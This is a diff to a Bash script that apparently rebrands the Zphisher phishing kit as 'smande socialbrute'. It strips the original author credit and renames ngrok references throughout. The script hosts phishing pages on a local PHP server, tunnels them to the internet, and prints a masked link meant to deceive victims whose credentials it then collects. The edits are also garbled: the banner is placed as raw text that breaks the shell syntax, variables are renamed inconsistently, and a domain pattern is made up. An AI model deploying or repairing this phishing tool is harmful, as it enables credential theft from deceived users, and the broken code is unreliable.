@@ -19,28 +19,23 @@ if [[ $checkphp == *'php'* ]]; then
 pkill -f -2 php > /dev/null 2>&1
 killall php > /dev/null 2>&1
 fi
-checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
-if [[ $checkngrok == *'ngrok'* ]]; then
-pkill -f -2 ngrok > /dev/null 2>&1
-killall ngrok > /dev/null 2>&1
+checkngrok=$(ps aux | grep -o "socialbrute" | head -n1)
+if [[ $checkngrok == *'socialbrute'* ]]; then
+pkill -f -2 socialbrute > /dev/null 2>&1
+killall socialbrute > /dev/null 2>&1
 fi
 
 }
 
 banner() {
+|welcome to smande socialbrute|
 
-clear
-printf "      \e[33;1m ______      _     _     _               \e[0m\n"
-printf "      \e[33;1m|___  /     | |   (_)   | |              \e[0m\n"
-printf "      \e[33;1m   / / _ __ | |__  _ ___| |__   ___ _ __ \e[0m\n"
-printf "      \e[32;1m  / /\e[33;1m | '_ \| '_ \| / __| '_ \ / _ \ '__|\e[0m\n"
-printf "      \e[32;1m / /__| |_) | | | | \__ \ | | |  __/ |   \e[0m\n"
-printf "      \e[32;1m/_____| .__/|_| |_|_|___/_| |_|\___|_|   \e[0m\n"
-printf "      \e[33;1m      | |                                \e[0m\n"
-printf "      \e[33;1m      |_|           \e[1;97m    Version 2.1 Beta      \e[0m\n"
-printf "\n"
-printf "   \e[92m[\e[37;1m+\e[92m]\e[0m\e[33;1m Tool Created by htr-tech (tahmid.rayat)\e[0m\n"
-printf "\n"
+╔═══╗──────────╔╗
+║╔═╗║──────────║║
+║╚══╦╗╔╦══╦═╗╔═╝╠══╗
+╚══╗║╚╝║╔╗║╔╗╣╔╗║║═╣
+║╚═╝║║║║╔╗║║║║╚╝║║═╣
+╚═══╩╩╩╩╝╚╩╝╚╩══╩══╝
 
 }
 
@@ -64,13 +59,13 @@ unzip -qq Modules.zip
 rm Modules.zip
 fi
 
-if [[ -e .htr/ngrok ]]; then
+if [[ -e .htr/socialbrute ]]; then
 printf ""
 else
 arch=$(uname -a | grep -o 'arm' | head -n1)
 arch2=$(uname -a | grep -o 'Android' | head -n1)
 if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
-printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Downloading Ngrok..\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Downloading socialbrute..\e[0m\n"
 wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1
 if [[ -e ngrok-stable-linux-arm.zip ]]; then
 unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
@@ -78,11 +73,11 @@ mv -f ngrok .htr > /dev/null 2>&1
 rm -rf ngrok-stable-linux-arm.zip > /dev/null 2>&1
 chmod +x .htr/ngrok > /dev/null 2>&1
 else
-printf "\n \e[1;31m[\e[0m\e[1;77m!\e[0m\e[1;31m]\e[0m\e[1;93m Error \e[1;31m[\e[0m\e[1;77m!\e[0m\e[1;31m]\e[0m\e[1;96m Install Ngrok Manually.\e[0m\n"
+printf "\n \e[1;31m[\e[0m\e[1;77m!\e[0m\e[1;31m]\e[0m\e[1;93m Error \e[1;31m[\e[0m\e[1;77m!\e[0m\e[1;31m]\e[0m\e[1;96m Install socialbrute Manually.\e[0m\n"
 exit 1
 fi
 else
-printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Downloading Ngrok..\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Downloading socialbrite..\e[0m\n"
 wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1 
 if [[ -e ngrok-stable-linux-386.zip ]]; then
 unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
@@ -90,7 +85,7 @@ mv -f ngrok .htr > /dev/null 2>&1
 rm -rf ngrok-stable-linux-386.zip > /dev/null 2>&1
 chmod +x .htr/ngrok > /dev/null 2>&1
 else
-printf "\n \e[1;31m[\e[0m\e[1;77m!\e[0m\e[1;31m]\e[0m\e[1;93m Error \e[1;31m[\e[0m\e[1;77m!\e[0m\e[1;31m]\e[0m\e[1;96m Install Ngrok Manually.\e[0m\n"
+printf "\n \e[1;31m[\e[0m\e[1;77m!\e[0m\e[1;31m]\e[0m\e[1;93m Error \e[1;31m[\e[0m\e[1;77m!\e[0m\e[1;31m]\e[0m\e[1;96m Install socialbrute Manually.\e[0m\n"
 exit 1
 fi
 fi
@@ -110,19 +105,19 @@ mv -f ngrok .htr/ngrok2  > /dev/null 2>&1
 rm -rf ngrok-2.2.8-linux-arm64.zip  > /dev/null 2>&1
 chmod +x .htr/ngrok2  > /dev/null 2>&1
 else
-printf "\n \e[1;31m[\e[0m\e[1;77m!\e[0m\e[1;31m]\e[0m\e[1;93m Error \e[1;31m[\e[0m\e[1;77m!\e[0m\e[1;31m]\e[0m\e[1;96m Install Ngrok Manually.\e[0m\n"
+printf "\n \e[1;31m[\e[0m\e[1;77m!\e[0m\e[1;31m]\e[0m\e[1;93m Error \e[1;31m[\e[0m\e[1;77m!\e[0m\e[1;31m]\e[0m\e[1;96m Install socialbrute Manually.\e[0m\n"
 exit 1
 fi
 else
-printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Downloading Ngrok Patch..\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Downloading socialbrute Patch..\e[0m\n"
 wget --no-check-certificate https://bin.equinox.io/a/4hREUYJSmzd/ngrok-2.2.8-linux-386.zip > /dev/null 2>&1 
 if [[ -e ngrok-2.2.8-linux-386.zip ]]; then
 unzip ngrok-2.2.8-linux-386.zip > /dev/null 2>&1
 mv -f ngrok .htr/ngrok2
 rm -rf ngrok-2.2.8-linux-386.zip
-chmod +x .htr/ngrok2
+chmod +x .htr/smande
 else
-printf "\n \e[1;31m[\e[0m\e[1;77m!\e[0m\e[1;31m]\e[0m\e[1;93m Error \e[1;31m[\e[0m\e[1;77m!\e[0m\e[1;31m]\e[0m\e[1;96m Install Ngrok Manually.\e[0m\n"
+printf "\n \e[1;31m[\e[0m\e[1;77m!\e[0m\e[1;31m]\e[0m\e[1;93m Error \e[1;31m[\e[0m\e[1;77m!\e[0m\e[1;31m]\e[0m\e[1;96m Install socialbrute Manually.\e[0m\n"
 exit 1
 fi
 fi
@@ -488,41 +483,41 @@ fi
 
 }
 
-start_ngrok() {
+start_socialbrute() {
 
 printf "\e[0m\n"
 printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Initializing...\e[0m\e[1;91m ( \e[0m\e[1;96mhttp://127.0.0.1:5555\e[0m\e[1;91m )\e[0m\n"
 sleep 1
 printf "\e[0m\n"
-printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Launching Ngrok ..Turn on Hotspot..\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Launching socialbrute ..Turn on Hotspot..\e[0m\n"
 cd .htr/www && php -S 127.0.0.1:5555 > /dev/null 2>&1 & 
 sleep 2
 ./.htr/ngrok http 127.0.0.1:5555 > /dev/null 2>&1 &
 sleep 5
-ngrok_link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
+ngrok_link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.socialbrute.io")
 ngrok_link1=${ngrok_link#https://}
 sleep 3
 banner
 printf "\e[0m\n"
-printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Link 1 :\e[0m\e[1;92m %s \n\n" $ngrok_link
-printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Link 2 :\e[0m\e[1;92m http://%s \n\n" $mask@$ngrok_link1
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Link 1 :\e[0m\e[1;92m %s \n\n" $socialbrute_link
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Link 2 :\e[0m\e[1;92m http://%s \n\n" $mask@$socialbrute_link1
 datafound
 
 }
 
-start_ngrok2() {
+start_socialbrute2() {
 
 printf "\e[0m\n"
 printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Initializing...\e[0m\e[1;91m ( \e[0m\e[1;96mhttp://127.0.0.1:5555\e[0m\e[1;91m )\e[0m\n"
 sleep 1
 printf "\e[0m\n"
-printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Launching Ngrok Patched ...\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Launching socialbrute Patched ...\e[0m\n"
 cd .htr/www && php -S 127.0.0.1:5555 > /dev/null 2>&1 & 
 sleep 2
-./.htr/ngrok2 http 127.0.0.1:5555 > /dev/null 2>&1 &
+./.htr/socialbrute http 127.0.0.1:5555 > /dev/null 2>&1 &
 sleep 5
-ngrok_link2=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
-ngrok_link3=${ngrok_link2#https://}
+socialbrute_link2=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.socialbrute.io")
+socialbrute_link3=${socialbrute_link2#https://}
 sleep 3
 banner
 printf "\e[0m\n"
